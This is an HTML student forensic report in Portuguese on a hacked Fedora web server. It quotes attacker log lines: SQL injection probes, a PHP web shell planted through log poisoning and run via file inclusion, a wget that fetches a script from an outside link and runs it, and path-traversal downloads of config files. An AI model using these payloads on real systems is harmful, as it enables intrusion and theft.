@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Forensic analysis</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        <link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        <script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>
+    </head>
+    <body class="vscode-light">
+        <h1 id="forensic-analysis">Forensic analysis</h1>
+<h2 id="authors">Authors:</h2>
+<p>Tomás Costa - 89016<br>
+João Marques - 89234</p>
+<h2 id="topics">Topics:</h2>
+<ol>
+<li><a href="#o-que-estava-implementado-a-n%C3%ADvel-de-confinamento-de-aplica%C3%A7%C3%B5es">O que estava implementado a nível de confinamento de aplicações?</a></li>
+<li><a href="#qual-a-sequ%C3%AAncia-de-a%C3%A7%C3%B5es-que-o-atacante-tomou">Qual a sequência de ações que o atacante tomou?</a></li>
+<li><a href="#que-vulnerabilidades-foram-exploradas-e-como">Que vulnerabilidades foram exploradas e como?</a></li>
+<li><a href="#que-altera%C3%A7%C3%B5es-foram-realizadas-e-qual-o-prop%C3%B3sito-aparente">Que alterações foram realizadas e qual o propósito aparente?</a></li>
+<li><a href="#foram-realmente-realizadas-transfer%C3%AAncias-se-sim-como-e-qual-o-conte%C3%BAdo">Foram realmente realizadas transferências? Se sim, como e qual o conteúdo?</a></li>
+<li><a href="#porque-%C3%A9-que-a-Firewall-externa-detetou-transfer%C3%AAncias-mas-nao-detetou-as-restantes-a%C3%A7%C3%B5es">Porque é que a Firewall externa detetou transferências mas nao detetou as restantes ações?</a></li>
+</ol>
+<h3 id="o-que-estava-implementado-a-n%c3%advel-de-confinamento-de-aplica%c3%a7%c3%b5es">O que estava implementado a nível de confinamento de aplicações?</h3>
+<p>Ao analisar os logs de sistema da máquina (neste caso, analisamos na máquina referência) no ficheiro <code>syslog</code> não encontramos nenhuma implementação de um sistema de confinamento de aplicações.</p>
+<p>Por outro lado, realizamos uma procura diretamente por aplicações de confinamento que esperássemos encontrar. Nesse sentido, encontrámos:</p>
+<ul>
+<li><a href="https://wiki.ubuntu.com/AppArmor">AppArmor</a>: permite confinar programas a um conjunto limitado de recursos, com perfis carregados diretamente no <em>kernel</em>. Tem um modo de <strong>enforcement</strong>, no qual confina verdadeiramente a aplicação, e um modo <strong>complain</strong>, no qual apenas regista se uma aplicação violar o seu perfil.<pre><code class="language-bash"><div>root@vm /m/reference_root<span class="hljs-comment"># grep -r "AppArmor" </span>
+Binary file usr/bin/setpriv matches
+Binary file usr/bin/systemd-analyze matches
+Binary file usr/bin/dbus-daemon matches
+Binary file usr/lib/systemd/systemd matches
+usr/share/doc/systemd/NEWS:        * A new unit file option AppArmorProfile= has been added to
+usr/share/doc/systemd/NEWS:          <span class="hljs-built_in">set</span> the AppArmor profile <span class="hljs-keyword">for</span> the processes of a unit.
+usr/share/doc/systemd/NEWS:        * Support <span class="hljs-keyword">for</span> detecting the IMA and AppArmor security
+usr/share/doc/systemd/NEWS:          this condition already supports SELinux and AppArmor we only
+usr/share/doc/dbus/NEWS:• AppArmor integration has been merged, with features similar to the
+usr/share/doc/dbus/NEWS:  Ubuntu<span class="hljs-string">'s GetConnectionAppArmorSecurityContext method has been superseded
+usr/share/doc/dbus/NEWS:• AppArmor integration requires libapparmor and optionally libaudit
+usr/share/doc/dbus/NEWS:• Don'</span>t duplicate audit subsystem integration <span class="hljs-keyword">if</span> AppArmor and SELinux are
+usr/share/doc/dbus/NEWS:• Log audit events <span class="hljs-keyword">for</span> AppArmor/SELinux policy violations whenever
+usr/share/doc/dbus/NEWS:• On Linux, add support <span class="hljs-keyword">for</span> AppArmor mediation of message sending and
+usr/share/doc/dbus/NEWS:  support), and eavesdropping (a new check, currently AppArmor-specific)
+Binary file usr/share/locale/cs/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/da/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/de/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/es/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/<span class="hljs-keyword">fi</span>/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/fr/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/ja/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/nl/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/pl/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/pt_BR/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/uk/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/vi/LC_MESSAGES/util-linux.mo matches
+Binary file usr/share/locale/zh_CN/LC_MESSAGES/util-linux.mo matches
+</div></code></pre>
+</li>
+<li><a href="https://docker.com">Docker</a>: permite criar um ambiente virtual no qual a aplicação está confinada a um sistema que apenas contém os serviços que precisa e apenas expõe os necessários. Pela análise do <code>syslog</code>, o <em>driver</em> foi inicializado, mas não sabemos ainda se foi usado no sistema.<pre><code class="language-bash"><div>root@vm /m/reference_root<span class="hljs-comment"># grep -r "Docker"</span>
+etc/services:docker          2375/tcp                <span class="hljs-comment"># Docker REST API (plain text)</span>
+etc/services:docker<span class="hljs-_">-s</span>        2376/tcp                <span class="hljs-comment"># Docker REST API (ssl)</span>
+Binary file etc/udev/hwdb.bin matches
+Binary file var/lib/rpm/Packages matches
+Binary file var/cache/dnf/packages.db matches
+Binary file var/cache/dnf/updates.solv matches
+Binary file var/cache/dnf/updates-filenames.solvx matches
+Binary file var/cache/dnf/updates-presto.solvx matches
+Binary file var/cache/dnf/updates-updateinfo.solvx matches
+Binary file var/cache/dnf/fedora.solv matches
+Binary file var/cache/dnf/fedora-filenames.solvx matches
+Binary file usr/lib/systemd/systemd-pull matches
+Binary file usr/lib/python3.4/site-packages/sos/plugins/__pycache__/docker.cpython-34.pyc matches
+Binary file usr/lib/python3.4/site-packages/sos/plugins/__pycache__/docker.cpython-34.pyo matches
+usr/lib/python3.4/site-packages/sos/plugins/docker.py:class Docker(Plugin, RedHatPlugin):
+usr/lib/python3.4/site-packages/sos/plugins/docker.py:    <span class="hljs-string">""</span><span class="hljs-string">"Docker information
+usr/lib/python3.4/site-packages/sos/plugins/docker.py:class RedHatDocker(Plugin, RedHatPlugin):
+usr/lib/udev/rules.d/85-nm-unmanaged.rules:# in another net namespace and managed by libvirt, Docker or the like.
+usr/lib/udev/hwdb.d/20-pci-vendor-model.hwdb: ID_MODEL_FROM_DATABASE=82557/8/9/0/1 Ethernet Pro 100 (PCI 	FastEther LAN on Docker)
+usr/share/doc/curl/CHANGES:  for Docker[4] which uses a special URL scheme (though the name contains
+usr/share/doc/systemd/NEWS:        * Docker containers are now detected as a separate type of
+usr/share/hwdata/pci.ids:		1179 0002  PCI FastEther LAN on Docker
+usr/share/vim/vim74/filetype.vim:"</span> Dockerfile
+usr/share/vim/vim74/filetype.vim:au BufNewFile,BufRead Dockerfile		setf dockerfile
+usr/share/vim/vim74/ftplugin/dockerfile.vim:<span class="hljs-string">" Language:	Dockerfile
+usr/share/vim/vim74/syntax/dockerfile.vim:"</span> dockerfile.vim - Syntax highlighting <span class="hljs-keyword">for</span> Dockerfiles
+</div></code></pre>
+</li>
+<li><a href="https://en.wikipedia.org/wiki/Chroot">Chroot</a>: isola o processo num diretório que aparenta ser o <em>root</em> e impede que o mesmo aceda a ficheiros para os quais não tem permissão.<pre><code><code><div>root@vm /m/reference_root# grep -r &quot;Chroot&quot;
+etc/ssh/sshd_config:#ChrootDirectory none
+Binary file var/cache/dnf/updates-filenames.solvx matches
+Binary file usr/sbin/sshd matches
+Binary file usr/lib64/librpm.so.7.0.0 matches
+Binary file usr/lib64/httpd/modules/mod_unixd.so matches
+usr/share/httpd/manual/mod/directives.html:&lt;li&gt;&lt;a href=&quot;mod_unixd.html#chrootdir&quot;&gt;ChrootDir&lt;/a&gt;&lt;/li&gt;
+usr/share/httpd/manual/mod/mod_unixd.html:&lt;li&gt;&lt;img alt=&quot;&quot; src=&quot;../images/down.gif&quot; /&gt; &lt;a 	href=&quot;#chrootdir&quot;&gt;ChrootDir&lt;/a&gt;&lt;/li&gt;
+usr/share/httpd/manual/mod/mod_unixd.html:&lt;div class=&quot;directive-section&quot;&gt;&lt;h2&gt;&lt;a name=&quot;ChrootDir&quot; 	id=&quot;ChrootDir&quot;&gt;ChrootDir&lt;/a&gt; &lt;a name=&quot;chrootdir&quot; id=&quot;chrootdir&quot;&gt;Directive&lt;/a&gt;&lt;/h2&gt;
+usr/share/httpd/manual/mod/mod_unixd.html:&lt;tr&gt;&lt;th&gt;&lt;a href=&quot;directive-dict.html#Syntax&quot;&gt;Syntax:&lt;/a&gt;&lt;/th&gt;&lt;td&gt;		&lt;code&gt;ChrootDir &lt;var&gt;/path/to/directory&lt;/var&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;
+usr/share/httpd/manual/mod/quickreference.html:&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;mod_unixd.html#chrootdir&quot;&gt;ChrootDir 	&lt;var&gt;/path/to/directory&lt;/var&gt;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;s&lt;/td&gt;&lt;td&gt;B&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;descr&quot; 		colspan=&quot;4&quot;&gt;Directory for apache to run chroot(8) after startup.&lt;/td&gt;&lt;/tr&gt;(AuthConfig|IncludesNOEXEC|ExecCGI|FollowSymLinks|MultiViews|Includes|Indexes|SymLinksIfOwnerMatch)\b/i;var ALL_KEYWORDS=[CPP_KEYWORDS,CSHARP_KEYWORDS,JSCRIPT_KEYWORDS,PERL_KEYWORDS+
+usr/share/vim/vim74/syntax/aptconf.vim:	\ Build-Options Chroot-Directory ConfigurePending FlushSTDIN
+usr/share/vim/vim74/syntax/sshdconfig.vim:syn keyword sshdconfigKeyword ChrootDirectory
+Binary file usr/libexec/mysqld matches
+Binary file srv/chroot-mariadb/usr/libexec/mysqld matches
+</div></code></code></pre>
+</li>
+</ul>
+<p>Estas informações permitem-nos apenas concluir que estas aplicações estão presentes no sistema, não que estão a ser aplicadas. A ausência de <em>logs</em> relativos a estas aplicações no ficheiro <code>syslog</code> permite-nos assumir que não foram aplicadas no sistema em produção, apesar de instaladas.</p>
+<p>No caso da aplicação <strong>Chroot</strong>, como verificamos a existência de ficheiros como <code>srv/chroot-mariadb/usr/libexec/mysqld</code>, assumimos que tenha sido aplicado confinamento à aplicação <strong>MariaDB</strong>/<strong>MySQL</strong>.</p>
+<p>Verificámos, também, por análise de vários ficheiros, como explicado posteriormente, que os vários serviços estavam divididos entre diferentes utilizadores do sistema. Apesar de isto ser normal e o comportamento por defeito destas aplicações, produz certo nível de confinamento das aplicações.</p>
+<h3 id="qual-a-sequ%c3%aancia-de-a%c3%a7%c3%b5es-que-o-atacante-tomou">Qual a sequência de ações que o atacante tomou?</h3>
+<p>Para determinar a seguência de ações do atacante, baseamo-nos na diferença entre os diretórios da máquina de referência e da máquina atacada:</p>
+<pre><code><code><div>Files reference_root/etc/httpd/logs/access_log and hacked_root/etc/httpd/logs/access_log differ
+Files reference_root/etc/httpd/logs/error_log and hacked_root/etc/httpd/logs/error_log differ
+Files reference_root/etc/httpd/logs/ssl_error_log and hacked_root/etc/httpd/logs/ssl_error_log differ
+Files reference_root/etc/issue and hacked_root/etc/issue differ
+Files reference_root/lib/issue and hacked_root/lib/issue differ
+Files reference_root/lib/os.release.d/issue-fedora and hacked_root/lib/os.release.d/issue-fedora differ
+Files reference_root/srv/chroot-mariadb/var/log/mariadb/mariadb.log and hacked_root/srv/chroot-mariadb/var/log/mariadb/mariadb.log differ
+Only in hacked_root/srv/chroot-mariadb/var/tmp: x.txt
+Files reference_root/usr/lib/issue and hacked_root/usr/lib/issue differ
+Files reference_root/usr/lib/os.release.d/issue-fedora and hacked_root/usr/lib/os.release.d/issue-fedora differ
+Files reference_root/var/cache/dnf/expired_repos.json and hacked_root/var/cache/dnf/expired_repos.json differ
+Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c: metalink.xml
+Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: 0fa09bb5f82e4a04890b91255f4b34360e38ede964fe8328f7377e36f06bad27-primary.xml.gz
+Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: 86a9c4f451ecfec1633638a477b6acef805fd6606978c7bd3c67434034f915a8-comps-f23.xml.xz
+Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: 874f220caf48ccd307c203772c04b8550896c42a25f82b93bd17082d69df80db-filelists.xml.gz
+Only in reference_root/var/cache/dnf/fedora-fe3d2f0c91e9b65c/repodata: repomd.xml
+Only in reference_root/var/cache/dnf: fedora-filenames.solvx
+Only in reference_root/var/cache/dnf: fedora.solv
+Only in hacked_root/var/cache/dnf: metadata_lock.pid
+Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6: metalink.xml
+Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: 01218690d29f35728973edd4587bfd73dbd6ba430808f1adc144655ccf647dfa-prestodelta.xml.xz
+Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: 3d51dd4a9499400fc360d1112e5d7d52c5a521bd08027033db5ff940fed7d468-comps-f23.xml.xz
+Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: 455209181fb97f3cdd54b73e729af34d238bbb3585ab23da7fcdc7ea1651bbd5-updateinfo.xml.xz
+Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: af3c46471b1d685f22c72a5e16d7383d333fb89db278711b2b8c794e29a91eaa-filelists.xml.gz
+Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: f0645865ea711dc4be0006e0fb110f5e24bfb29b48cb826a747439b7f82d5251-primary.xml.gz
+Only in reference_root/var/cache/dnf/updates-e042e478e0621ea6/repodata: repomd.xml
+Only in reference_root/var/cache/dnf: updates-filenames.solvx
+Only in reference_root/var/cache/dnf: updates-presto.solvx
+Only in reference_root/var/cache/dnf: updates.solv
+Only in reference_root/var/cache/dnf: updates-updateinfo.solvx
+File reference_root/var/lib/gssproxy/default.sock is a socket while file hacked_root/var/lib/gssproxy/default.sock is a socket
+Files reference_root/var/lib/mlocate/mlocate.db and hacked_root/var/lib/mlocate/mlocate.db differ
+Only in reference_root/var/lib/NetworkManager: dhclient-4c619efa-fd8b-445d-a5dc-eec91932d461-enp0s3.lease
+Only in hacked_root/var/lib/NetworkManager: dhclient-654f0ae0-663a-4ed2-bc13-5332c11742e6-enp0s3.lease
+Only in hacked_root/var/lib/NetworkManager: dhclient-7625647c-766a-4ce2-87e2-b500b39e69ad-enp0s8.lease
+Only in reference_root/var/lib/NetworkManager: dhclient-a98b76e8-8bef-4838-966b-6c9095e68d76-enp0s3.lease
+Only in hacked_root/var/lib/NetworkManager: dhclient-ec763d29-5b76-4030-b343-61600bb2933e-enp0s3.lease
+Files reference_root/var/lib/NetworkManager/timestamps and hacked_root/var/lib/NetworkManager/timestamps differ
+Files reference_root/var/lib/rpm/__db.001 and hacked_root/var/lib/rpm/__db.001 differ
+Files reference_root/var/lib/rpm/__db.002 and hacked_root/var/lib/rpm/__db.002 differ
+Files reference_root/var/lib/rpm/__db.003 and hacked_root/var/lib/rpm/__db.003 differ
+Files reference_root/var/lib/rsyslog/imjournal.state and hacked_root/var/lib/rsyslog/imjournal.state differ
+Files reference_root/var/lib/systemd/random-seed and hacked_root/var/lib/systemd/random-seed differ
+Files reference_root/var/log/audit/audit.log and hacked_root/var/log/audit/audit.log differ
+Files reference_root/var/log/btmp and hacked_root/var/log/btmp differ
+Files reference_root/var/log/cron and hacked_root/var/log/cron differ
+Files reference_root/var/log/dnf.librepo.log and hacked_root/var/log/dnf.librepo.log differ
+Files reference_root/var/log/dnf.log and hacked_root/var/log/dnf.log differ
+Files reference_root/var/log/dnf.rpm.log and hacked_root/var/log/dnf.rpm.log differ
+Files reference_root/var/log/hawkey.log and hacked_root/var/log/hawkey.log differ
+Files reference_root/var/log/httpd/access_log and hacked_root/var/log/httpd/access_log differ
+Files reference_root/var/log/httpd/error_log and hacked_root/var/log/httpd/error_log differ
+Files reference_root/var/log/httpd/ssl_error_log and hacked_root/var/log/httpd/ssl_error_log differ
+Files reference_root/var/log/journal/b74ff8c513354faa8633ee944bc76c73/system.journal and hacked_root/var/log/journal/b74ff8c513354faa8633ee944bc76c73/system.journal differ
+Files reference_root/var/log/maillog and hacked_root/var/log/maillog differ
+Files reference_root/var/log/mariadb/mariadb.log and hacked_root/var/log/mariadb/mariadb.log differ
+Files reference_root/var/log/messages and hacked_root/var/log/messages differ
+Files reference_root/var/log/secure and hacked_root/var/log/secure differ
+Files reference_root/var/log/syslog and hacked_root/var/log/syslog differ
+Files reference_root/var/log/wtmp and hacked_root/var/log/wtmp differ
+Files reference_root/var/www/html/images/road.jpg and hacked_root/var/www/html/images/road.jpg differ
+Only in hacked_root/var/www/html: r.php
+</div></code></code></pre>
+<h4 id="an%c3%a1lise-dos-ficheiros-diferentes">Análise dos ficheiros diferentes</h4>
+<p>Por análise do ficheiro <code>etc/httpd/logs/access_log</code>, verificamos que o atacante começou por realizar vários ataques por SQL Injection, como por exemplo:</p>
+<pre><code><code><div>192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2 HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2 HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=7511 HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2.%27%28.%29%22%29%2C%28%29 HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2%27vQDNvJ%3C%27%22%3EkdZcIq HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2%29%20AND%204107%3D3069%20AND%20%283913%3D3913 HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2%20AND%207309%3D1070 HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2%20AND%202497%3D1724--%20GrhU HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2%27%29%20AND%203989%3D8856%20AND%20%28%27Mvif%27%3D%27Mvif HTTP/1.1&quot; 200 -
+192.168.56.1 - - [14/Dec/2019:01:38:18 +0000] &quot;GET /products.php?type=2%27%20AND%207213%3D4313%20AND%20%27EilI%27%3D%27EilI HTTP/1.1&quot; 200 -
+</div></code></code></pre>
+<p>Um dos principais e mais impactantes ataques foi induzido pela seguinte linha:</p>
+<pre><code><code><div>192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] &quot;GET /index.php?a=&lt;?php system($_GET['cmd']);?&gt; HTTP/1.1&quot; 200 1516
+</div></code></code></pre>
+<p>Esta injeção de código <em>PHP</em> permite criar uma <strong>backdoor</strong>, pela qual pode ser possível aceder a uma <em>shell</em> do sistema.
+Depois de criado o <em>backdoor</em>, o atacante descarregou um <em>script</em>	e executou-o.</p>
+<pre><code><code><div>192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] &quot;GET /display.php?type=1&amp;lang=/var/log/httpd/access_log&amp;cmd=ls%20/ HTTP/1.1&quot; 200 218571
+192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] &quot;GET /display.php?type=1&amp;lang=/var/log/httpd/access_log&amp;cmd=find%20/ HTTP/1.1&quot; 200 3573861
+192.168.56.1 - - [14/Dec/2019:01:39:10 +0000] &quot;GET /display.php?type=1&amp;lang=/var/log/httpd/access_log&amp;cmd=find%20/%20-perm%20-4000 HTTP/1.1&quot; 200 219136
+192.168.56.1 - - [14/Dec/2019:01:39:11 +0000] &quot;GET /display.php?type=1&amp;lang=/var/log/httpd/access_log&amp;cmd=wget%20https://bit.ly/2LRYDSQ%20-O%20/tmp/steg_drop.py HTTP/1.1&quot; 200 218909
+192.168.56.1 - - [14/Dec/2019:01:39:11 +0000] &quot;GET /display.php?type=1&amp;lang=/var/log/httpd/access_log&amp;cmd=find%20/ HTTP/1.1&quot; 200 3580340
+192.168.56.1 - - [14/Dec/2019:01:39:12 +0000] &quot;GET /display.php?type=1&amp;lang=/var/log/httpd/access_log&amp;cmd=/opt/venv/bin/python3%20/tmp/steg_drop.py HTTP/1.1&quot; 200 219228
+</div></code></code></pre>
+<p>O atacante acedeu também a várias tabelas da base de dados, incluido tabelas de sistema, e descarregou vários ficheiros de configuração, obtendo informação que lhe permitiu injetar o código referido.</p>
+<p>Ao analisar o ficheiro <code>etc/httpd/logs/error_log</code> notamos que ocorreram vários erros causados por tentativas de acesso a vários ficheiros por parte do atacante que, sendo feitos pelo utilizador <strong>Apache</strong> a dados do utilizador <strong>MySQL</strong>, resultavam em erros de permissão de acesso.</p>
+<p>No ficheiro <code>srv/chroot-mariadb/usr/libexec/mysqld</code> não encontramos nada anormal, pelo que assumimos que nada foi atacado nesta aplicação em particular.</p>
+<p>Comprovámos também que, no diretório <code>srv/chroot-mariadb/var/tmp</code>, estava presente o ficheiro <code>x.txt</code>, que, conforme analisado em <code>etc/httpd/logs/access_log</code>, foi inserido:</p>
+<pre><code><code><div>192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /details.php?prod=1%20union%20select%201,2,3,4,'hello'%20into%20outfile%20'/var/tmp/x.txt' HTTP/1.1&quot; 200 1673
+</div></code></code></pre>
+<p>Ao analisar o ficheiro <code>var/log/secure</code> vimos que o atacante efectuou várias tentativas de login por <strong>ssh</strong> à <em>backdoor</em> criada anteriormente:</p>
+<pre><code><code><div>Dec 14 01:39:06 localhost sshd[1905]: Invalid user &lt;?php system($_GET[&quot;cmd&quot;]);?&gt; from 192.168.56.1
+Dec 14 01:39:06 localhost sshd[1905]: input_userauth_request: invalid user &lt;?php system($_GET[&quot;cmd&quot;]);?&gt; [preauth]
+Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): check pass; user unknown
+Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.1
+Dec 14 01:39:10 localhost sshd[1905]: Failed password for invalid user &lt;?php system($_GET[&quot;cmd&quot;]);?&gt; from 192.168.56.1 port 46636 ssh2
+Dec 14 01:39:10 localhost sshd[1905]: error: maximum authentication attempts exceeded for invalid user &lt;?php system($_GET[&quot;cmd&quot;]);?&gt; from 192.168.56.1 port 46636 ssh2 [preauth]
+Dec 14 01:39:10 localhost sshd[1905]: Disconnecting: Too many authentication failures [preauth]
+</div></code></code></pre>
+<p>Verificamos também que foi criado o ficheiro <code>/var/www/html/r.php</code>:</p>
+<pre><code class="language-php"><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"Road Runner was here"</span>;
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+<p>Este ficheiro indica que o user conseguiu acesso a uma terminal, pois devido ao <strong>Chroot</strong> no servidor de base de dados, não era possivel o user escrever ficheiros na pasta var/html/www, no entanto como vimos no exemplo em cima, o user conseguiu escrever nessa pasta.</p>
+<p>Não encontramos, no entanto, nenhuma referência à criação deste ficheiro nos <em>logs</em>.
+Assumimos, assim, que o atacante ganhou acesso à máquina através do <em>backdoor</em> previamente mencionado e pôde apagar os logs que registaram os seus movimentos.</p>
+<h3 id="que-vulnerabilidades-foram-exploradas-e-como">Que vulnerabilidades foram exploradas e como?</h3>
+<p>O atacante explorou a vulnerabilidade a <strong>SQL Injection</strong> no <em>PHP</em> que tinha sido reportada na auditoria realizada. Esta vulnerabilidade foi explorada de forma a <strong>visualizar</strong> e <strong>descarregar</strong> informação do sistema, assim como <strong>inserir</strong> outros dados e <em>scripts</em>.</p>
+<p>Por outro lado, aproveitou a falta de <strong>confinamento</strong> das aplicações e explorou esta vulnerabilidade de forma a aceder a todo o sistema a partir da vulnerabilidade persente no servidor <em>Apache</em>.</p>
+<p>Além disso, aproveitou o facto da máquina do servidor web ter um servidor <strong>ssh</strong> aberto com autenticação por password (vulnerável a ataques por <em>brute force</em>) e de o servidor da base de dados estar na mesma máquina.</p>
+<h4 id="quais-o-atacante-tentou-explorar-mas-foram-barradas">Quais o atacante tentou explorar mas foram barradas?</h4>
+<p>Verificamos, principalmente por análise do ficheiro <code>etc/httpd/logs/error_log</code>, que o atacante tentou aproveitar as vulnerabilidades no <em>PHP</em> para aceder à base de dados e a outros dados de sistema, mas não conseguiu devido ao <strong>confinamento</strong> de cada serviço a um utilizador diferente e à limitação de <strong>permissões</strong> para cada ficheiro.</p>
+<p>Também não foi possível inserir ficheiros e dados em determinados diretórios do sistema pela mesma razão.</p>
+<h3 id="que-altera%c3%a7%c3%b5es-foram-realizadas-e-qual-o-prop%c3%b3sito-aparente">Que alterações foram realizadas e qual o propósito aparente?</h3>
+<p>Uma das alterações principais foi realizada na pasta <code>var/www/html/images</code> , à imagem road.jpg. Esta nova versão da imagem contêm uma mensagem escondida na imagem, algo denominado esteganografia. Ao dar decode da imagem usando uma <a href="http://stylesuxx.github.io/steganography/">ferramenta</a>, conseguimos extrair a mensagem no inicio da imagem que diz:</p>
+<pre><code><code><div>Parabéns!
+https://elearning.ua.pt/mod/assign/view.php?id=647250
+</div></code></code></pre>
+<p>Esta alteração foi possivel porque o utilizador descarregou um ficheiro pelo <a href="https://bit.ly/2LRYDSQ%20">link</a>. Este script, que não conseguimos transferir, foi a arma do ataque e realizou as mudanças na imagem atraves de estaganografia. O link já não se encontra disponivel e como o script foi colocado no diretório /tmp/, já não está presente no sistema.</p>
+<h3 id="foram-realmente-realizadas-transfer%c3%aancias-se-sim-como-e-qual-o-conte%c3%bado">Foram realmente realizadas transferências? Se sim, como e qual o conteúdo?</h3>
+<p>Sim foram realizadas transferências, o atacante deve ter notado que ao clicarmos no catálogo de carros, o método para descarregar ficheiros era através de um php denominado <strong>downloads.php</strong>, pelo que o user tentou aceder outros ficheiros através desse link e conseguiu com sucesso, visto que nao havia confinamento a nivel do diretório de downloads e ele pode voltar atras nos diretórios.</p>
+<pre><code><code><div>192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=Brochure.pdf HTTP/1.1&quot; 200 13305
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../index.php HTTP/1.1&quot; 200 115
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../x.txt HTTP/1.1&quot; 200 41
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../config.php HTTP/1.1&quot; 200 130
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../display.php HTTP/1.1&quot; 200 1557
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php HTTP/1.1&quot; 200 41
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=Brochure.pdf HTTP/1.1&quot; 200 13305
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../index.php HTTP/1.1&quot; 200 115
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../x.txt HTTP/1.1&quot; 200 41
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../config.php HTTP/1.1&quot; 200 130
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../products.php HTTP/1.1&quot; 200 117
+192.168.56.1 - - [14/Dec/2019:01:39:04 +0000] &quot;GET /download.php?item=../display.php HTTP/1.1&quot; 200 1557
+</div></code></code></pre>
+<p>Apesar de as respostas terem sido todas de sucesso (200), nem todos os ficheiros foram transferidos, então analisamos no wireshark os ficheiros que o utilizador recebeu e chegamos a conclusão que ele transferiu todos exceto o ficheiro x.txt, visto que este não existia no sistema.
+E como conseguimos ver, o atacante conseguiu transferir alguns ficheiros criticos de sistema como <strong>config.php</strong> e <strong>display.php</strong> que lhe permitiram visualizar informação <strong>crítica</strong> do sistema.</p>
+<p>Por outro lado, o atacante pode <strong>visualizar</strong> o nome e conteúdo de muitas tabelas da base de dados graças à vulnerabilidade a SQL Injection referida anteriormente.</p>
